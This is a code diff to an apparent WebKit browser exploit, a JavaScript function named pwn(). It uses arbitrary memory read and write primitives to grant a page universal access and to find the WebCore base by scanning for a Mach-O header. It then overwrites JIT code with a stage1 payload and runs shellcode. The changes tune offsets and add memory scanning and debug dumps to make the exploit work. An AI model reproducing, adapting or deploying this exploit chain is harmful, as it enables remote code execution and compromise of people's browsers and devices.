@@ -401,9 +401,18 @@ function pwn() {
     log(`[*] Modified SecurityOrigin->m_universalAccess @ ${SecurityOrigin_flags2.toString(16)}`);
 
 
-    
-    var webcore_base = vtab_addr - 0x250c87d;
-    log(`[*] webcore base @ ${(webcore_base).toString(16)}`); 
+    var webcore_base = vtab_addr - 0x2b00000 - (vtab_addr % 0x100); //0x2c00000 is too slow
+	for (var i=0; webcore_base + i < vtab_addr; i += 0x10) {
+		if (read64(webcore_base + i) == 0x100000cfeedfad0) {
+			log(`[*] webcore base @ ${(webcore_base + i).toString(16)}`);
+			webcore_base += i;
+			break;
+		}
+		if ((webcore_base + i) % 0x80 == 0) {
+			millis(1);
+		}
+	}
+
     var read_webcore = read64(webcore_base);
     log(`[*] webcore read test @ ${read_webcore.toString(16)}`);
 
@@ -416,7 +425,7 @@ function pwn() {
     var jitCodeAddr = read64(executableAddr + 8);
     log(`[*] JITCode instance @ ${jitCodeAddr.toString(16)}`);
 
-    var JITCode = read64(jitCodeAddr + 0x1a0);
+    var JITCode = read64(jitCodeAddr + 0x1a8);
     log(`[*] JITCode @ ${JITCode.toString(16)}`);
 
     stage1.replace(new Int64("0x4141414141414141"), new Int64(webcore_base));
@@ -424,6 +433,9 @@ function pwn() {
     ArbitraryWrite(JITCode, stage1);
 
     log('[*] Executed stage1.bin!');
+    for (var i=0; i < 0x100; i += 0x10) {
+        log(`[*] ${(JITCode + i).toString(16)}: ${read64(JITCode + i).toString(16)}`);
+    }
 
     shellcodeFunc();
 
